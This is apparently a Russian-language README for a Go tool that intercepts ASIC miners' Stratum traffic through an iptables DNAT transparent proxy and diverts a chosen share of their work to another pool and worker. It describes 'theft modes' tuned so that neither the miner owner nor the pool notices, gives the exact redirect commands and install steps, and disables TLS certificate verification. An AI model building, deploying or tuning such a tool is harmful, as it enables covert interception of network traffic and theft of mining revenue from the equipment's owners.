# Mining Proxy — Stratum Share Redirector

Go-утилита для «откусывания» шар из майнинг-трафика ASIC. Прозрачно
проксирует TCP-трафик между ASIC и реальным пулом, перехватывает Stratum V1
`mining.submit` и перенаправляет выбранную часть шар на другой пул/воркер
(ваша комиссия по договору).

## Принцип работы

```
                       ┌────────────────────────────┐
 ASIC ──TCP──▶ DNAT    │         mining-proxy        │
            (iptables) │    (слушает 0.0.0.0:8443)   │
                       │                            │
                       │  ┌──────────────────────┐  │
                       └─▶│ реальный пул          │──▶ пул, куда майнит ASIC
                           │ (upstream_pool)      │
                           └──────────────────────┘
                                    ▲
                                    │  (копия части шар)
                           ┌────────┴────────┐
                           │ целевой пул      │──▶ ваш воркер (комиссия)
                           │ + ваш воркер     │
                           └─────────────────┘
```

1. **Настройка NAT**: `iptables` перенаправляет майнинг-трафик ASIC (только
   порт реального пула) на прокси. Остальной трафик (DNS, NTP, DHCP и т.п.)
   не затрагивается.
2. **Проксирование**: прокси прозрачно связывает ASIC с реальным пулом
   (двунаправленный pipe).
3. **Перехват**: каждый `mining.submit` парсится.
4. **Решение**: в зависимости от режима кражи часть шар перенаправляется
   копией на целевой пул.
5. **Оригинал всегда дублируется** в реальный пул — ASIC и пул не замечают
   подмены, соединение не рвётся.

## Режимы кражи

**1. «Пауза в шарах» (`pause_shares: true`) — точный процент (рекомендуется).**
Кусаем 1 шару каждые `100/percentage` шар. Процент достигается надёжно и не
зависит от скорости потока. `interval_min/max_hours` игнорируются.

**2. «Пауза по времени» (`pause_shares: false`) — «укуси и отпусти».**
Каждая шара участвует в рулетке (вероятность `percentage/100`), но после укуса
встаёт случайная временная пауза в диапазоне `[interval_min, interval_max]`
(по умолчанию 2–20 часов). Фактический процент ниже заявленного, т.к. пауза
его «режет».

В обоих режимах применяется принцип «укуси и отпусти»: шары не забираются
пачками подряд длительное время (пул не пересоздаёт соединение, нет сброса
хешрейта).

## Структура проекта

```
mining-proxy/
├── main.go                  — точка входа, CLI, graceful shutdown
├── config/
│   └── config.go            — загрузка/валидация YAML, дефолты
├── proxy/
│   ├── server.go            — TCP listener, accept loop, лимит соединений
│   ├── conn.go              — обработка соединения, bidirectional pipe
│   ├── stratum.go           — парсинг Stratum V1 JSON-RPC
│   └── redirect.go          — ShareStealer: логика кражи, forward, health-check
├── iptables/
│   └── setup.go             — настройка NAT/DNAT/MASQUERADE + cleanup
├── monitor/
│   └── http.go              — HTTP /status и /health
├── tests/
│   ├── stratum_test.go      — юнит-тесты парсинга
│   ├── redirect_test.go     — юнит-тесты логики кражи
│   └── integration_test.go  — e2e с двумя mock-пулами
├── testrig/                 — локальный стенд для ручного тестирования
│   ├── mockpool/            — mock-пул Stratum V1
│   └── miner/               — эмулятор ASIC-майнера
├── scripts/
│   ├── setup.sh             — установка на Ubuntu/Debian (systemd)
│   ├── start.sh             — интерактивный запуск в фоне
│   └── stop.sh              — остановка по PID-файлу
├── config.example.yaml      — пример конфига
├── mining-proxy.service     — systemd unit
└── README.md / ARCHITECTURE.md
```

## Конфигурация

| Поле | Описание | Дефолт |
|---|---|---|
| `listen_addr` | адрес прокси | `0.0.0.0:8443` |
| `upstream_pool` | реальный пул (`host:port`) | требуется |
| `upstream_ssl` | TLS для upstream | `false` |
| `steal_to.pool` | целевой пул (`host:port`) | требуется |
| `steal_to.worker` | ваш воркер | требуется |
| `steal_to.pass` | пароль воркера | `x` |
| `steal_to.ssl` | TLS для целевого пула | `false` |
| `percentage` | % шар для кражи (0.1–100) | `5.0` |
| `pause_shares` | режим «паузы в шарах» (точный %) | `true` |
| `interval_min_hours` | мин. интервал между укусами (режим по времени) | `2` |
| `interval_max_hours` | макс. интервал между укусами | `20` |
| `batch_size` | сколько шар за один цикл кражи | `1` |
| `target_timeout_sec` | таймаут ожидания ответа целевого пула | `30` |
| `allowed_subnets` | подсети для приёма трафика (iptables) | — |
| `setup_iptables` | авто-настройка iptables при старте | `false` |
| `monitor_addr` | адрес HTTP /status | `127.0.0.1:9090` |

Полный пример — в `config.example.yaml`.

## Тестирование

```bash
# юнит + интеграционные тесты
go test ./...

# сборка
go build -o mining-proxy .

# проверки
go vet ./...
gofmt -l .
```

### Что проверяют тесты

- **stratum_test.go** — парсинг Stratum: `IsMinerSubmit`, подмена воркера,
  извлечение воркера.
- **redirect_test.go** — логика кражи: процент, режим «паузы в шарах»
  (точный %), «не кусать до паузы», учёт принятых шар (reject не
  засчитывается), failover при недоступности целевого пула.
- **integration_test.go** — полный e2e цикл с двумя mock-пулами: все шары
  дублируются в реальный пул, часть уходит в целевой с правильным воркером,
  один subscribe/authorize переиспользуется.

### Локальный стенд (testrig)

```bash
# два mock-пула: «реальный» на 3333 и «целевой» на 3334
go run ./testrig/mockpool -listen 127.0.0.1:3333
go run ./testrig/mockpool -listen 127.0.0.1:3334

# прокси с локальным конфигом (config.local.yaml, см. scripts/start.sh)
go run . --config config.local.yaml

# эмулятор ASIC: 10 шар в секунду, воркер пул.вася3344
go run ./testrig/miner -proxy 127.0.0.1:8443 -worker вася3344 -sps 10
```

## Установка (Ubuntu/Debian)

```bash
sudo bash scripts/setup.sh
```

Скрипт: ставит Go (если нет), собирает бинарник, копирует в
`/usr/local/bin/`, создаёт `/etc/mining-proxy/config.yaml`, устанавливает
systemd-сервис `mining-proxy`.

После установки:

```bash
# отредактируйте конфиг
nano /etc/mining-proxy/config.yaml

# запустить
systemctl start mining-proxy
systemctl enable mining-proxy

# логи
journalctl -u mining-proxy -f

# статус (мониторинг)
curl http://127.0.0.1:9090/status

# проверить правила iptables
iptables -t nat -L -v
```

## Мониторинг

`GET http://127.0.0.1:9090/status` (JSON):

| Поле | Описание |
|---|---|
| `stolen_shares` | сколько шар перенаправлено (попытки) |
| `total_shares` | сколько шар пришло всего |
| `stolen_percent` | % перенаправленных попыток |
| `accepted_shares` | сколько шар ПРИНЯТО целевым пулом (`result:true`) |
| `accepted_percent` | % выполненных (принятых) шар — итоговая комиссия |
| `next_cycle_in` | до следующего разрешённого укуса |
| `uptime` | время работы |
| `target_pool` / `target_worker` | целевой пул и воркер |
| `target_up` | жив ли целевой пул (по health-check) |
| `forward_fails` | ошибок перенаправления (failover) |

`GET /health` — простой `ok` для systemd/проб.

## Как направить ASIC на прокси (вручную, без setup_iptables)

```bash
# ip_forward
echo 1 > /proc/sys/net/ipv4/ip_forward

# трафик ASIC на порт пула (3333) → на прокси
iptables -t nat -A PREROUTING -s <ASIC_IP_ИЛИ_SUBNET> \
  -p tcp --dport 3333 -j DNAT --to-destination <СЕРВЕР>:8443

iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

## Безопасность

- Код полностью открыт, без скрытых закладок.
- Прокси не слушает наружу (мониторинг только на `127.0.0.1`).
- iptables ограничивается только разрешёнными подсетями и портом пула.
- Для SSL-пулов TLS проверка сертификата отключена (`InsecureSkipVerify`) —
  необходимо для публичных пулов с самоподписанными сертификатами.

Детальная архитектура — в `ARCHITECTURE.md`.